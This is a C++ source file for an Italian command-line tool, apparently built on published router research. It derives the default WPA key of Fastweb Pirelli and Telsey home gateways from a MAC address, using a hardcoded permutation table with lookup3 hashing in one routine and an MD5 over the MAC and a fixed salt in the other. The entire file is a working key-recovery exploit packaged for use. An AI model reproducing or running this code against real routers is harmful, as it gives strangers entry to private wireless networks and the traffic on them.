extern "C" {
    #include "lookup3.h"
}
#include "md5.h"
#include "functions.hpp"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
using namespace std;

void telsey(unsigned char* key, const char* mac) {
    
    unsigned char macaddress[6];
    HexSequenceToChar(mac, macaddress, 6);
    
    int modello[64][4] = { 
        { 6,2,1,6 }, { 2,1,2,6 }, { 5,3,4,3 }, { 5,4,3,3 }, { 3,5,3,1 }, { 3,6,4,2 }, { 1,5,1,2 }, { 2,5,2,1 },
        { 3,5,3,3 }, { 4,2,4,5 }, { 5,2,5,4 }, { 6,2,6,6 }, { 3,2,1,6 }, { 2,1,2,2 }, { 5,3,2,4 }, { 4,4,6,3 },
        { 5,5,6,5 }, { 6,2,5,1 }, { 3,6,1,6 }, { 3,2,4,6 }, { 6,3,3,5 }, { 3,4,2,5 }, { 1,5,5,4 }, { 4,1,6,4 },
        { 5,4,1,1 }, { 4,3,2,2 }, { 3,2,3,6 }, { 2,4,5,4 }, { 1,3,4,5 }, { 1,1,3,3 }, { 1,1,1,6 }, { 2,2,2,5 },
        { 5,1,3,3 }, { 4,4,4,1 }, { 1,3,5,2 }, { 6,6,6,1 }, { 1,5,6,1 }, { 2,2,6,3 }, { 3,3,6,2 }, { 4,4,3,4 },
        { 2,1,3,5 }, { 2,6,3,6 }, { 1,2,5,1 }, { 2,2,2,5 }, { 3,3,3,3 }, { 4,4,4,4 }, { 6,5,1,2 }, { 5,1,6,6 },
        { 2,1,6,1 }, { 1,2,6,2 }, { 3,3,5,3 }, { 4,5,5,4 }, { 5,4,2,6 }, { 6,6,2,5 }, { 4,1,2,6 }, { 4,2,1,5 },
        { 5,3,3,6 }, { 5,4,4,2 }, { 3,5,4,1 }, { 3,4,6,2 }, { 4,2,3,4 }, { 6,1,2,3 }, { 6,4,5,2 }, { 1,3,4,1 }
                           };
                           
    uint32_t vettore[64];
    
    for (int i=0; i<64; i++){
        vettore[i] = macaddress[modello[i][0] - 1] * (0x1000000) + macaddress[modello[i][1] - 1] * (0x10000) + \
                     macaddress[modello[i][2] - 1] * (0x100) + macaddress[modello[i][3] - 1];
    }
    
    uint32_t valoreuscita = 0;
    for (int x=0; x<64; x++){ valoreuscita = hashword(vettore, x, valoreuscita); }
    
    uint32_t vettorenuovo[64];
    
    for (int i=0; i<64; i++) {
        if (i < 8) vettorenuovo[i] = vettore[i] << 3;
        else if (i < 16) vettorenuovo[i] = vettore[i] >> 5;
        else if (i < 32) vettorenuovo[i] = vettore[i] >> 2;
        else vettorenuovo[i] = vettore[i] << 7;
    }
    
    uint32_t valorenuovo = 0;
    for (int x=0; x<64; x++){ valorenuovo = hashword(vettorenuovo, x, valorenuovo); }
    
    char v1[10];
    sprintf(v1, "%x", valoreuscita);
    char v2[10];
    sprintf(v2, "%x", valorenuovo);
    v2[5] = '\0';
    
    strncpy((char *)key, v1+3, 5);
    strncpy((char *)key+5, v2, 5);
    key[10] = '\0';
}

void pirelli(unsigned char * key, const char * mac) {
    // Trasformo le sequenze hex in byte (unsigned char)
    const char* fissa = "223311340281FA22114168111201052271421066";
    unsigned char stringa[20];
    HexSequenceToChar(fissa, stringa, 20);
    
    unsigned char macaddress[6];
    HexSequenceToChar(mac, macaddress, 6);
    
    // Ottengo l'md5 della sequenza fissa e del mac
    unsigned char m_digest[16];
    MD5_CTX context;
    MD5Init(&context);
    MD5Update(&context, macaddress, 6);
    MD5Update(&context, stringa, 20);
    MD5Final(m_digest, &context);
    
    char bins[8*4+1];
    bins[8*4] = '\0';
    for (int i=0; i<4; i++) {
        char buffer[8+1];
        IntToStrBinary((unsigned int)m_digest[i], buffer, 8);
        strncpy(bins+(8*i), buffer, 8);
    }
    unsigned int blocchi[5];
    for (int i=0; i<5; i++) {
        char buffer[6];
        strncpy(buffer, bins+(5*i), 5);
        buffer[5] = '\0';
        blocchi[i] = strtoul(buffer, NULL, 2);
        if (blocchi[i] >= 0xA) {
            blocchi[i] = blocchi[i] + 0x57;
        }
    }
    
    char buffer[3];
    for (int i = 0; i < 5; i++) {
        sprintf(buffer, "%.2x", blocchi[i]);
        key[i*2] = buffer[0];
        key[i*2+1] = buffer[1];
    }
    key[10] = '\0';
}

int main(int argc, char* argv[])
{
    if (argc != 2) {
        fputs("Uso: fastweb { MAC | help }\n", stderr);
        return 1;
    }
    char* mac = (char*)malloc(strlen(argv[1])+1);
    strcpy(mac, argv[1]);
    
    RemoveChar(mac, ':');
    RemoveChar(mac, '-');
    RemoveChar(mac, '.');
    RemoveChar(mac, ' ');
    
    ToUpper(mac);
    
    if (!strcmp(mac, "HELP")) {
        fputs(\
"Uso: fastweb { MAC | help }\n \
Scritto per HAG Fastweb Pirelli o Telsey (tutti al momento)\n \
(MAC 001CA2xxxxxx / 001DBXxxxxxx o 002196xxxxxx / 00036Fxxxxxx)\n \
Coder:     FiloSottile     http://www.pytux.it http://filosottile.info\n \
Algoritmo: White Hats Crew http://wifiresearchers.wordpress.com\n", stderr);
        return 0;
    }
    
    if (strlen(mac) != 12) {
        fputs("Uso: fastweb { MAC | help }\n", stderr);
        fputs("Questo non sembra un MAC\n", stderr);
        return 1;
    }
    
    unsigned char key[30];
    if (IsPirelli(mac)) {
        pirelli(key, mac);
    } else if (!strncmp(mac, "002196", 6) || !strncmp(mac, "00036F", 6)) {
        telsey(key, mac);
    } else {
        fputs("ATTENZIONE: l'HAG non sembra essere ne' un Fastweb Pirelli ne' un Telsey\n", stderr);
        fputs("(MAC 001CA2xxxxxx / 001DBXxxxxxx o 002196xxxxxx / 00036Fxxxxxx)\n", stderr);
        exit(1);
    }
    puts((char *)key);
}
